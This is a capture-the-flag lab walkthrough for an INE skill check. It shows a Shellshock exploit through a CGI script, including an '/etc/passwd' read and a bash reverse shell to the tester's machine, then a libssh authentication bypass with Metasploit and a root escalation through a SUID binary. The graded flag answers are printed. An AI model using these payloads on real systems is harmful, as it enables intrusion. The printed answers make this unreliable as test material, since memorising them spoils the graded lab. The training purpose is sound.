## Overview

System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.

This lab is designed to test your knowledge and skills in performing system/host-based attacks on Linux targets and identifying hidden information on a target machine.

## Tasks

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Flags to Capture:**

- **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- Burp Suite
- Metasploit Framework

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

##### **Flag 1:** Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

First, we need to get access to the system shell or some kind of RCE to read flag on the system.

Let's scan the target first.

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV target1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 23:43 IST
Nmap scan report for target1.ine.local (192.21.209.3)
Host is up (0.000026s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
MAC Address: 02:42:C0:15:D1:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds

```


This target is running an website. Let's visit.

![[Pasted image 20250617234743.png]]

Looking up the **URL** `http://target1.ine.local/browser.cgi`. This is using CGI plugins of Apache, there is a possibility of ShellShock Vulnerability. Let's Try to confirm this.

```bash
┌──(root㉿INE)-[~]
└─# nmap --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi" target1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 23:55 IST
Nmap scan report for target1.ine.local (192.21.209.3)
Host is up (0.000026s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      http://seclists.org/oss-sec/2014/q3/685
MAC Address: 02:42:C0:15:D1:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

```

So, It is vulnerable. Let's exploit.

Start the BurpSuite and Intercept the traffic and forward the request to the repeater tab and Let's test first.

`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`

and check what happens.

![[Pasted image 20250617235801.png]]

So, It executed successfully. Let's take a reverse shell.

Let's first start the listner up.

```bash
┌──(root㉿INE)-[~]
└─# nc -lnvp 1234                                          
listening on [any] 1234 ...

```

Done, Let's move forward 

`bash -i >& /dev/tcp/<Your Kali IP here>/1234 0>&1` 

You're full payload should look like this

```url
() { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/<Your Kali IP HERE>/1234 0>&1'
```



![[Pasted image 20250618000025.png]]

Let's fire up the payload and check ..

![[Pasted image 20250618000152.png]]

So, here nothing looks. Let's check our listener.

```bash
┌──(root㉿INE)-[~]
└─# nc -lnvp 1234                                          
listening on [any] 1234 ...
connect to [192.21.209.2] from (UNKNOWN) [192.21.209.3] 47382
bash: cannot set terminal process group (28): Inappropriate ioctl for device
bash: no job control in this shell
daemon@target1:/opt/apache/htdocs$ 

```

We got a reverse shell.

Our Second flag is here in this directory itself where we got the shell but it's hidden.

```bash
daemon@target1:/opt/apache/htdocs$ ls
ls
browser.cgi
index.html
static
daemon@target1:/opt/apache/htdocs$ la
la
bash: la: command not found
daemon@target1:/opt/apache/htdocs$ ls -al
ls -al
total 32
drwxr-xr-x 1 root root 4096 Jun 17 18:11 .
drwxr-xr-x 1 root root 4096 Dec 28  2021 ..
-rw-r--r-- 1 root root   39 Jun 17 18:11 .flag.txt
-rwxr-xr-x 1 root root 6364 Dec 28  2021 browser.cgi
-rw-r--r-- 1 root root  517 Dec 28  2021 index.html
drwxr-xr-x 5 root root 4096 Dec 27  2021 static
daemon@target1:/opt/apache/htdocs$ 

```

See, flag 2 is here. 

Let's check for our first flag now.

```bash
daemon@target1:/opt/apache/htdocs$ cd /
cd /
daemon@target1:/$ ls
ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start-apache2.sh
startup.sh
sys
tmp
usr
var
daemon@target1:/$    

```

Got the first flag too.

```bash
daemon@target1:/$ cat flag.txt
cat flag.txt
FLAG1_24ccffa888c04b8b8828daa1ba0bc804
daemon@target1:/$ 

```


##### **Flag 2:** In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

```bash
daemon@target1:/opt/apache/htdocs$ cat .flag.txt
cat .flag.txt
FLAG2_156e79d039b3483f9676aa08edd42d85
daemon@target1:/opt/apache/htdocs$ 

```

##### **Flag 3:** Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

For these we have a new target **target2.ine.local**

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV target2.ine.local                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 00:08 IST
Nmap scan report for target2.ine.local (192.21.209.4)
Host is up (0.000026s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
MAC Address: 02:42:C0:15:D1:04 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds

```


So, here SSH is running with a version I have never seen before let's check for exploits.

```bash
┌──(root㉿INE)-[~]
└─# searchsploit libssh      
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
libSSH - Authentication Bypass                                        | linux/remote/45638.py
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                            | linux/remote/46307.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

Hmm, I think second one can work. Let's check and fireup metasploit.

```bash
┌──(root㉿INE)-[~]
└─# service postgresql start 
Starting PostgreSQL 16 database server: main.
                                                                                                        
┌──(root㉿INE)-[~]
└─# msfconsole
Metasploit tip: Display the Framework log using the log command, learn 
more with help log
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc
                                                                                                   
     Trace program: running                                                                        
                                                                                                   
           wake up, Neo...                                                                         
        the matrix has you                                                                         
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.4.12-dev                          ]
+ -- --=[ 2426 exploits - 1250 auxiliary - 428 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search libssh

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner
   1    \_ action: Execute                      .                .       .      Execute a command
   2    \_ action: Shell                        .                .       .      Spawn a shell


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/ssh/libssh_auth_bypass                                                                                    
After interacting with a module you can manually set a ACTION with set ACTION 'Shell'

msf6 > use 0
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > 

```

Let's set our target

```bash
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > show options

Module options (auxiliary/scanner/ssh/libssh_auth_bypass):

   Name           Current Setting    Required  Description
   ----           ---------------    --------  -----------
   CHECK_BANNER   true               no        Check banner for libssh
   CMD                               no        Command or alternative shell
   CreateSession  true               no        Create a new session for every successful login
   RHOSTS         target2.ine.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          22                 yes       The target port
   SPAWN_PTY      false              no        Spawn a PTY
   THREADS        1                  yes       The number of concurrent threads (max one per host)


Auxiliary action:

   Name   Description
   ----   -----------
   Shell  Spawn a shell



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true
SPAWN_PTY => true
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 192.21.209.4:22 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details
[*] Command shell session 4 opened (192.21.209.2:34215 -> 192.21.209.4:22) at 2025-06-18 00:15:46 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > 

```

We got shell opened let's interact with this

```bash
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions

Active sessions
===============

  Id  Name  Type   Information                                                  Connection
  --  ----  ----   -----------                                                  ----------
  4         shell  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.21.209.2:34215 -> 192.21.209.4:22 (192.21.209.4)

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions 4
[*] Starting interaction with 4...


Shell Banner:
_[?2004hsh-5.2$
-----
          

sh-5.2$ 



```

Let's take a bash shell

```bash
sh-5.2$ /bin/bash -i
/bin/bash -i
[user@target2 /]$ 

```

Now, let's take our flags .


```bash
[user@target2 /]$ ls
ls
bin   dev  home  lib64  opt   root  sbin  sys  usr
boot  etc  lib   mnt    proc  run   srv   tmp  var
[user@target2 /]$ cd home
cd home
[user@target2 home]$ ls
ls
temp  user
[user@target2 home]$ cd user
cd user
[user@target2 ~]$ ls
ls
flag.txt  greetings  welcome
[user@target2 ~]$ cat flag.txt
cat flag.txt
FLAG3_f16eba20ce344ba5bee8393862a5e5ca
[user@target2 ~]$ 

```

Got the 3rd flag.
##### **Flag 4:** The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

So, We don't have root privileges we need to escalate our privileges.  Checking the file system found out something that can escalate our privileges.

```bash
[user@target2 ~]$ ls -al
ls -al
total 56
drwx------ 1 user user 4096 Jun 17 18:11 .
drwxr-xr-x 1 root root 4096 Nov 14  2024 ..
-rw-r--r-- 1 user user   21 Sep 24  2024 .bash_logout
-rw-r--r-- 1 user user   57 Sep 24  2024 .bash_profile
-rw-r--r-- 1 user user  172 Sep 24  2024 .bashrc
drwxr-xr-x 2 user user 4096 Nov 14  2024 .ssh
-rw-r--r-- 1 root root   39 Jun 17 18:11 flag.txt
-rwx------ 1 root root 8296 Jun 11  2024 greetings
-rwsr-xr-x 1 root root 8344 Jun 11  2024 welcome

```

`-rwsr-xr-x 1 root root 8344 Jun 11  2024 welcome`

the s here denotes SUID binary. This means this program can execute with root privileges. Let's try to manipulate this and get root shell.

```bash
[user@target2 ~]$ file welcome
file welcome
welcome: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped

```

So, this is a ELF binary that this means it can call other dependencies . let's check that dependency with strings command.

```bash
welcome: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped
[user@target2 ~]$ strings welcome
strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
greetings
;*3$"
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
welcome.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
[user@target2 ~]$ 

```

So, here greetings is called with root privileges. Let's do one thing, we will remove original greetings and put bash shell file that will execute with root privileges escalating our privilege.

```bash
[user@target2 ~]$ ls
ls
flag.txt  greetings  welcome
[user@target2 ~]$ rm greetings
rm greetings
rm: remove write-protected regular file 'greetings'? y
y
[user@target2 ~]$ cp /bin/bash greetings 
cp /bin/bash greetings 
[user@target2 ~]$ ls
ls
flag.txt  greetings  welcome
[user@target2 ~]$ .   

```

Fingers crossed let's run welcome binary and check that our priviledges are escalated or not.

```bash
[user@target2 ~]$ ./welcome
./welcome
[root@target2 ~]# 

```

**BOOM!** We got root shell. now let's find our last flag.

```bash
[root@target2 ~]# cd /root
cd /root
[root@target2 root]# ls
ls
flag.txt
[root@target2 root]# cat flag.txt
cat flag.txt
FLAG4_603b3b6ff3c54168a00da3f11aa91417
[root@target2 root]# 

```

Done !